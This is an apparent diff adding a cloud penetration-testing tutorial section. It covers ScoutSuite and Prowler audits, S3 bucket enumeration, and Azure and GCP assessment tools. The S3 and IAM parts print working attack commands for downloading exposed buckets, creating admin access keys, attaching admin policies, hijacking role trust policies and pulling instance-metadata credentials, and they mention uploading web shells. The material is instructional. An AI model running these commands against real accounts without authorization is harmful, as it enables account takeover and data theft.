+# Method 1: AWS CLI credentials file (~/.aws/credentials)
+aws configure
+
+# AWS Access Key ID: AKIA...
+# AWS Secret Access Key: ...
+# Default region name: us-east-1
+# Default output format: json
+
+# Method 2: Environment variables
+export AWS_ACCESS_KEY_ID="AKIA..."
+export AWS_SECRET_ACCESS_KEY="..."
+export AWS_DEFAULT_REGION="us-east-1"
+
+# Method 3: IAM role (if running on EC2 instance)
+# Automatically uses instance profile
+
+# Run ScoutSuite AWS scan:
+scout aws
+
+# Output (during scan):
+# [*] Collecting data from AWS API...
+# [*] Fetching IAM data...
+# [*] Fetching EC2 data...
+# [*] Fetching S3 data...
+# [*] Fetching RDS data...
+# [*] Fetching Lambda data...
+# [*] Analyzing findings...
+# [*] Generating report...
+# [+] Report saved to: scoutsuite-report/aws-<account-id>.html
+
+# Open the report:
+firefox scoutsuite-report/aws-*.html
+
+# Advanced options:
+
+# Scan specific services only:
+scout aws --services s3 ec2 iam
+
+# Use specific AWS profile:
+scout aws --profile production
+
+# Save report to custom location:
+scout aws --report-dir /tmp/cloud-audit/
+
+# Scan multiple regions:
+scout aws --regions us-east-1 us-west-2 eu-west-1
+
+# Exclude certain checks:
+scout aws --skip-findings s3-bucket-no-logging
+
+# Resume interrupted scan:
+scout aws --resume</div>
+
+            <h4>Understanding ScoutSuite Findings</h4>
+
+            <div class="code"># ScoutSuite report shows findings categorized by service:
+
+# Example findings:
+
+# 🔴 DANGER - S3 Buckets with Public Read Access
+# Bucket Name: company-backups
+# Issue: Bucket allows public read access
+# Risk: Anyone on the internet can download all files
+# Recommendation: Remove public access, use bucket policies
+# 
+# How to verify:
+aws s3api get-bucket-acl --bucket company-backups
+
+# How to fix:
+aws s3api put-public-access-block --bucket company-backups --public-access-block-configuration "BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true"
+
+# 🔴 DANGER - IAM Users with Admin Access
+# User: backup-script
+# Issue: User has AdministratorAccess policy attached
+# Risk: Compromise of these credentials = full account takeover
+# Recommendation: Use principle of least privilege
+# 
+# How to check:
+aws iam list-attached-user-policies --user-name backup-script
+
+# How to fix:
+# Create custom policy with only needed permissions
+# Attach specific policy, remove AdministratorAccess
+
+# 🟡 WARNING - Security Groups Allow 0.0.0.0/0 SSH Access
+# Security Group: sg-0a1b2c3d
+# Issue: Port 22 open to entire internet
+# Risk: Brute-force attacks, credential stuffing
+# Recommendation: Restrict to specific IP ranges
+# 
+# How to check:
+aws ec2 describe-security-groups --group-ids sg-0a1b2c3d
+
+# How to fix:
+aws ec2 revoke-security-group-ingress --group-id sg-0a1b2c3d --protocol tcp --port 22 --cidr 0.0.0.0/0
+aws ec2 authorize-security-group-ingress --group-id sg-0a1b2c3d --protocol tcp --port 22 --cidr 1.2.3.4/32
+
+# 🟡 WARNING - RDS Databases Not Encrypted
+# Database: production-db
+# Issue: Storage encryption disabled
+# Risk: Data at rest not protected
+# Recommendation: Enable encryption (requires recreation)
+
+# 🟡 WARNING - Root Account MFA Not Enabled
+# Issue: Root account doesn't have multi-factor authentication
+# Risk: Stolen password = complete account compromise
+# Recommendation: Enable virtual or hardware MFA
+
+# 🟢 INFO - CloudTrail Not Enabled in All Regions
+# Issue: API activity not logged in some regions
+# Risk: Attacker actions might not be detected
+# Recommendation: Enable CloudTrail in all regions</div>
+
+            <h3>Prowler - AWS Security Best Practices Auditor</h3>
+
+            <p><strong>Prowler</strong> is a command-line tool that performs AWS security assessments based on CIS Amazon Web Services Foundations Benchmark. It runs 200+ checks!</p>
+
+            <div class="code"># Install Prowler:
+pip3 install prowler
+
+# Or use Docker:
+docker pull toniblyx/prowler
+
+# Run basic scan:
+prowler aws
+
+# Output (live during scan):
+# Check 1.1 [check11] Avoid use of "root" account ... [OK]
+# Check 1.2 [check12] Ensure MFA is enabled for "root" account ... [FAIL]
+# Check 1.3 [check13] Ensure credentials unused for 90 days are disabled ... [OK]
+# Check 2.1 [check21] Ensure CloudTrail is enabled in all regions ... [FAIL]
+# Check 2.2 [check22] Ensure CloudTrail log file validation is enabled ... [OK]
+# [... 200+ checks ...]
+
+# Run specific check group:
+prowler aws -g check1,check2
+# Only IAM checks (group 1) and CloudTrail checks (group 2)
+
+# Run specific checks:
+prowler aws -c check11,check12,check21
+
+# Generate HTML report:
+prowler aws -M html
+
+# Output files:
+# prowler-output-<account-id>-<date>.html
+# prowler-output-<account-id>-<date>.json
+# prowler-output-<account-id>-<date>.csv
+
+# Scan specific regions:
+prowler aws -f us-east-1,us-west-2
+
+# Exclude specific checks:
+prowler aws -e check11,check22
+
+# Use specific AWS profile:
+prowler aws -p production
+
+# Run in quiet mode (only show failures):
+prowler aws -q
+
+# Save results to S3:
+prowler aws -B s3://my-prowler-reports/
+
+# Run with custom checks:
+prowler aws -x /path/to/custom_checks/</div>
+
+            <h4>Key Prowler Checks (CIS Benchmark)</h4>
+
+            <div class="code"># Identity and Access Management (Group 1):
+# • 1.1: Avoid root account usage
+# • 1.2: MFA enabled for root
+# • 1.3: Disable unused credentials (90+ days)
+# • 1.4: Access keys rotated every 90 days
+# • 1.5: Password policy requires uppercase
+# • 1.6: Password policy requires lowercase
+# • 1.7: Password policy requires symbols
+# • 1.8: Password policy requires numbers
+# • 1.9: Password policy minimum length 14
+# • 1.10: Password reuse prevention
+# • 1.11: Password expiration 90 days
+# • 1.12-1.22: Various IAM policy checks
+
+# Logging (Group 2):
+# • 2.1: CloudTrail enabled in all regions
+# • 2.2: CloudTrail log file validation enabled
+# • 2.3: S3 bucket for CloudTrail not public
+# • 2.4: CloudTrail integrated with CloudWatch Logs
+# • 2.5: AWS Config enabled in all regions
+# • 2.6: S3 bucket logging enabled for CloudTrail
+# • 2.7: CloudTrail logs encrypted with KMS
+# • 2.8: KMS key rotation enabled
+# • 2.9: VPC Flow Logging enabled
+
+# Monitoring (Group 3):
+# • 3.1-3.14: CloudWatch alarms for suspicious activity
+#   - Unauthorized API calls
+#   - Console sign-in without MFA
+#   - Root account usage
+#   - IAM policy changes
+#   - CloudTrail configuration changes
+#   - Failed console authentication
+#   - Security group changes
+#   - NACL changes
+#   - Network gateway changes
+#   - Route table changes
+#   - VPC changes
+
+# Networking (Group 4):
+# • 4.1: Security groups don't allow 0.0.0.0/0 ingress on port 22
+# • 4.2: Security groups don't allow 0.0.0.0/0 ingress on port 3389
+# • 4.3: VPC default security group restricts all traffic
+
+# Additional AWS checks (Group 7):
+# • S3 bucket versioning enabled
+# • S3 bucket MFA delete enabled
+# • S3 bucket encryption enabled
+# • ELB listener using HTTPS/TLS
+# • RDS encryption enabled
+# • RDS backup retention period > 7 days
+# • RDS multi-AZ enabled
+# • Lambda functions not public
+# • EC2 instances use IMDSv2</div>
+
+            <h3>S3 Bucket Enumeration & Exploitation</h3>
+
+            <h4>Finding Public S3 Buckets</h4>
+
+            <div class="code"># S3 bucket naming patterns to try:
+# company-name
+# companyname
+# company-backups
+# company-logs
+# company-prod
+# company-dev
+# company-staging
+# www.company.com
+# company.com
+
+# Method 1: Direct URL access
+curl http://company-backups.s3.amazonaws.com
+
+# If bucket exists and allows listing:
+# <?xml version="1.0" encoding="UTF-8"?>
+# <ListBucketResult>
+#   <Name>company-backups</Name>
+#   <Contents>
+#     <Key>database-dump.sql</Key>
+#     <Key>credentials.txt</Key>
+#   </Contents>
+# </ListBucketResult>
+
+# Method 2: Using AWS CLI
+aws s3 ls s3://company-backups
+
+# If public:
+# 2026-01-07 10:00:00  1048576 database-dump.sql
+# 2026-01-07 11:30:00     1024 credentials.txt
+
+# Download all files:
+aws s3 sync s3://company-backups ./downloaded-data/
+
+# Method 3: Using s3scanner
+# https://github.com/sa7mon/S3Scanner
+pip3 install s3scanner
+
+# Scan list of potential buckets:
+echo "company-backups
+company-logs
+company-prod
+company-dev" > buckets.txt
+
+s3scanner scan --buckets-file buckets.txt
+
+# Output:
+# [+] company-backups - PUBLIC - ListBucket
+# [+] company-logs - PUBLIC - ListBucket, GetObject
+# [-] company-prod - NOT_EXIST
+# [-] company-dev - FORBIDDEN
+
+# Method 4: Google Dorking for S3 buckets
+# Search: site:s3.amazonaws.com "company name"
+# Search: site:s3.amazonaws.com intitle:"Index of"
+# Search: inurl:s3.amazonaws.com filetype:pdf confidential
+
+# Method 5: Using bucket-stream (real-time monitoring)
+# https://github.com/eth0izzle/bucket-stream
+git clone https://github.com/eth0izzle/bucket-stream
+cd bucket-stream
+pip3 install -r requirements.txt
+
+# Monitor certstream for new S3 buckets:
+python3 bucket-stream.py
+
+# Output (live stream):
+# [+] company-backup.s3.amazonaws.com - PUBLIC
+# [+] startup-logs.s3.amazonaws.com - PUBLIC</div>
+
+            <h4>Exploiting S3 Misconfigurations</h4>
+
+            <div class="code"># Common S3 misconfigurations:
+
+# 1. Public Read Access (COMMON)
+# Anyone can list and download files
+aws s3 ls s3://vulnerable-bucket/
+aws s3 cp s3://vulnerable-bucket/secrets.txt ./
+
+# 2. Public Write Access (RARE but CRITICAL)
+# Anyone can upload files!
+echo "hacked" > test.txt
+aws s3 cp test.txt s3://vulnerable-bucket/
+
+# Exploitation scenario:
+# - Upload web shell to bucket
+# - If bucket serves website, execute shell
+# - Or: Upload malicious files for phishing
+
+# 3. Authenticated Read (AWS account required, any account works)
+# Not public, but any AWS user can access
+aws s3 ls s3://authenticated-bucket/ --profile my-aws-account
+
+# 4. Object-level permissions (each file has its own ACL)
+# Bucket might be private, but individual objects are public
+aws s3api get-object-acl --bucket company-bucket --key sensitive.pdf
+
+# Output:
+# "Grantee": {
+#   "Type": "Group",
+#   "URI": "http://acs.amazonaws.com/groups/global/AllUsers"
+# }
+# ← This file is public even if bucket isn't!
+
+# 5. Bucket policies allowing specific actions
+aws s3api get-bucket-policy --bucket company-bucket
+
+# Policy might allow:
+# - GetObject from any IP (download files)
+# - PutObject from specific IPs (upload if you're in range)
+# - DeleteObject (catastrophic!)
+
+# Checking bucket ACL:
+aws s3api get-bucket-acl --bucket target-bucket
+
+# Output showing public access:
+# "Grantee": {
+#   "Type": "Group",
+#   "URI": "http://acs.amazonaws.com/groups/global/AllUsers"
+# },
+# "Permission": "READ"
+
+# Checking bucket policy:
+aws s3api get-bucket-policy --bucket target-bucket --query Policy --output text | jq
+
+# Impact of S3 exposure:
+# • Data breach (customer data, PII)
+# • Credential theft (AWS keys, API tokens)
+# • Source code disclosure
+# • Database backups
+# • Internal documents
+# • Intellectual property</div>
+
+            <h3>IAM Privilege Escalation</h3>
+
+            <p>IAM (Identity and Access Management) misconfigurations can allow attackers to escalate privileges from low-privileged access to admin!</p>
+
+            <h4>Common IAM Privilege Escalation Vectors</h4>
+
+            <div class="code"># 1. iam:CreateAccessKey on other users
+# If you can create access keys for other users, compromise their accounts!
+
+# List all users:
+aws iam list-users
+
+# Create access key for admin user:
+aws iam create-access-key --user-name admin
+
+# Output:
+# {
+#   "AccessKey": {
+#     "AccessKeyId": "AKIA...",
+#     "SecretAccessKey": "..."
+#   }
+# }
+
+# Now use admin's credentials!
+export AWS_ACCESS_KEY_ID="AKIA..."
+export AWS_SECRET_ACCESS_KEY="..."
+
+# You're now admin!
+
+# 2. iam:AttachUserPolicy or iam:AttachRolePolicy
+# Attach AdministratorAccess policy to yourself!
+
+aws iam attach-user-policy --user-name my-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+
+# You're now admin!
+
+# 3. iam:PutUserPolicy
+# Create inline policy granting admin access
+
+aws iam put-user-policy --user-name my-user --policy-name AdminPolicy --policy-document '{
+  "Version": "2012-10-17",
+  "Statement": [{
+    "Effect": "Allow",
+    "Action": "*",
+    "Resource": "*"
+  }]
+}'
+
+# 4. iam:CreatePolicyVersion
+# If you can modify existing policies attached to privileged roles
+
+aws iam create-policy-version --policy-arn arn:aws:iam::123456789012:policy/CustomPolicy --policy-document '{
+  "Version": "2012-10-17",
+  "Statement": [{
+    "Effect": "Allow",
+    "Action": "*",
+    "Resource": "*"
+  }]
+}' --set-as-default
+
+# 5. sts:AssumeRole
+# If you can assume a privileged role
+
+aws sts assume-role --role-arn arn:aws:iam::123456789012:role/AdminRole --role-session-name exploit
+
+# Use returned credentials to act as AdminRole
+
+# 6. iam:PassRole + ec2:RunInstances
+# Launch EC2 instance with privileged instance profile, then access from instance
+
+aws ec2 run-instances --image-id ami-12345678 --instance-type t2.micro --iam-instance-profile Name=AdminInstanceProfile
+
+# SSH into instance, credentials auto-loaded:
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/AdminInstanceProfile
+
+# 7. lambda:CreateFunction + iam:PassRole
+# Create Lambda function with privileged role, execute it
+
+aws lambda create-function --function-name exploit --runtime python3.9 --role arn:aws:iam::123456789012:role/AdminRole --handler lambda_function.lambda_handler --zip-file fileb://exploit.zip
+
+aws lambda invoke --function-name exploit output.txt
+
+# Lambda runs with AdminRole permissions!
+
+# 8. iam:UpdateAssumeRolePolicy
+# Modify trust policy to allow yourself to assume role
+
+aws iam update-assume-role-policy --role-name AdminRole --policy-document '{
+  "Version": "2012-10-17",
+  "Statement": [{
+    "Effect": "Allow",
+    "Principal": {"AWS": "arn:aws:iam::123456789012:user/my-user"},
+    "Action": "sts:AssumeRole"
+  }]
+}'
+
+# Now assume the role:
+aws sts assume-role --role-arn arn:aws:iam::123456789012:role/AdminRole --role-session-name pwned</div>
+
+            <h4>Automated IAM Enumeration</h4>
+
+            <div class="code"># enumerate-iam (identify permissions)
+# https://github.com/andresriancho/enumerate-iam
+
+pip3 install enumerate-iam
+
+# Run enumeration:
+enumerate-iam --access-key AKIA... --secret-key ...
+
+# Output:
+# [+] Testing IAM permissions...
+# [+] iam:GetUser - SUCCESS
+# [+] iam:ListUsers - DENIED
+# [+] iam:ListRoles - SUCCESS
+# [+] ec2:DescribeInstances - SUCCESS
+# [+] s3:ListAllMyBuckets - SUCCESS
+# [+] s3:GetObject - SUCCESS (on bucket: company-data)
+
+# CloudMapper (visualize AWS environment)
+# https://github.com/duo-labs/cloudmapper
+
+git clone https://github.com/duo-labs/cloudmapper
+cd cloudmapper
+pip3 install -r requirements.txt
+
+# Configure:
+python3 cloudmapper.py configure add-account --config-file config.json --name prod --id 123456789012
+
+# Collect data:
+python3 cloudmapper.py collect --account prod
+
+# Generate visualization:
+python3 cloudmapper.py prepare --account prod
+python3 cloudmapper.py webserver
+
+# Open http://localhost:8000 - see full AWS environment map!
+
+# Pacu (AWS exploitation framework)
+# https://github.com/RhinoSecurityLabs/pacu
+
+git clone https://github.com/RhinoSecurityLabs/pacu
+cd pacu
+pip3 install -r requirements.txt
+python3 pacu.py
+
+# Inside Pacu:
+Pacu > import_keys access_key_id secret_access_key
+Pacu > run iam__enum_permissions
+Pacu > run iam__privesc_scan
+Pacu > run s3__bucket_finder
+
+# Pacu has 50+ modules for AWS exploitation!</div>
+
+            <h3>Azure & GCP Security Assessment</h3>
+
+            <h4>Azure with ScoutSuite</h4>
+
+            <div class="code"># Azure requires service principal or CLI authentication
+
+# Method 1: Azure CLI (recommended)
+az login
+
+# Method 2: Service principal
+export AZURE_SUBSCRIPTION_ID="..."
+export AZURE_TENANT_ID="..."
+export AZURE_CLIENT_ID="..."
+export AZURE_CLIENT_SECRET="..."
+
+# Run ScoutSuite:
+scout azure
+
+# Key Azure findings:
+# • Storage accounts allowing public blob access
+# • Network security groups with 0.0.0.0/0 rules
+# • Virtual machines without encryption
+# • Key vaults without access policies
+# • SQL databases without firewall rules
+# • App Services allowing HTTP (not HTTPS)
+
+# Azure-specific tools:
+
+# ROADtools (Azure AD enumeration)
+pip3 install roadrecon
+
+# Authenticate:
+roadrecon auth --access-token <token>
+
+# Gather data:
+roadrecon gather
+
+# Analyze in GUI:
+roadrecon gui
+
+# MicroBurst (Azure security assessment)
+git clone https://github.com/NetSPI/MicroBurst
+cd MicroBurst
+Import-Module .\MicroBurst.psm1
+
+# Enumerate:
+Invoke-EnumerateAzureBlobs -Base company
+Invoke-EnumerateAzureSubDomains -Base company
+
+# Find storage accounts:
+# company.blob.core.windows.net
+# company-backups.blob.core.windows.net</div>
+
+            <h4>GCP with ScoutSuite</h4>
+
+            <div class="code"># GCP requires service account or gcloud authentication
+
+# Authenticate with gcloud:
+gcloud auth login
+gcloud auth application-default login
+
+# Run ScoutSuite:
+scout gcp --project-id my-project-123
+
+# Key GCP findings:
+# • GCS buckets with allUsers permission
+# • Compute instances with default service accounts
+# • Firewall rules allowing 0.0.0.0/0
+# • Cloud SQL instances publicly accessible
+# • IAM service accounts with excessive permissions
+# • Cloud Functions with public invoker role
+
+# GCP-specific tools:
+
+# GCP IAM Privilege Escalation (similar to AWS)
+# • roles/iam.serviceAccountUser - impersonate service accounts
+# • roles/iam.serviceAccountKeyAdmin - create service account keys
+# • roles/compute.instanceAdmin - create instances with service accounts
+
+# Enumerate GCS buckets:
+gsutil ls
+
+# Check bucket permissions:
+gsutil iam get gs://company-bucket
+
+# If "allUsers" or "allAuthenticatedUsers" present = public!
+
+# Download bucket contents:
+gsutil -m cp -r gs://company-bucket/* ./downloaded/</div>
+
+            <div class="metaphor-box">
+                <h4>🎉 You're Now a Cloud Security Expert!</h4>
+                <p>You've mastered:<br><br>
+                ✅ <strong>ScoutSuite:</strong> Multi-cloud automated security assessment<br>
+                ✅ <strong>Prowler:</strong> AWS CIS benchmark auditing (200+ checks)<br>
+                ✅ <strong>S3 Enumeration:</strong> Finding and exploiting public buckets<br>
+                ✅ <strong>IAM Exploitation:</strong> 8+ privilege escalation techniques<br>
+                ✅ <strong>Azure Security:</strong> Storage accounts, NSGs, Key Vaults<br>
+                ✅ <strong>GCP Security:</strong> GCS buckets, IAM, Compute instances<br><br>
+                <strong>The Cloud Pentester's Mindset:</strong><br>
+                • <strong>Think configurations, not exploits:</strong> 99% of cloud breaches are misconfigurations<br>
+                • <strong>Automate everything:</strong> Environments are too large for manual testing<br>
+                • <strong>Understand IAM deeply:</strong> Identity is the new perimeter<br>
+                • <strong>Check the obvious first:</strong> Public S3 buckets, 0.0.0.0/0 security groups<br>
+                • <strong>Map the environment:</strong> Know what you're testing before diving deep<br><br>
+                <strong>Real-world cloud breaches:</strong><br>
+                • Capital One (2019): SSRF + overprivileged IAM role = 100M records<br>
+                • Uber (2016): GitHub credentials in S3 bucket = full AWS compromise<br>
+                • Dow Jones (2017): Public S3 bucket = 2.2M customer records exposed<br>
+                • Tesla (2018): Public Kubernetes dashboard = cryptomining in cloud<br><br>
+                <strong>Practice resources:</strong><br>
+                • <strong>CloudGoat:</strong> Vulnerable-by-design AWS environment<br>
+                • <strong>flAWS.cloud:</strong> AWS security challenges<br>
+                • <strong>AWSGoat:</strong> Vulnerable AWS infrastructure<br>
+                • <strong>GCP-Goat:</strong> Vulnerable GCP environment<br><br>
+                Cloud security is THE fastest-growing pentesting specialty. Companies are desperate for people who understand IAM, storage permissions, and cloud-native security. Master this = job security for life! ☁️🔐</p>
+            </div>
         </section>
 
         <section id="advanced-wireless" class="section">
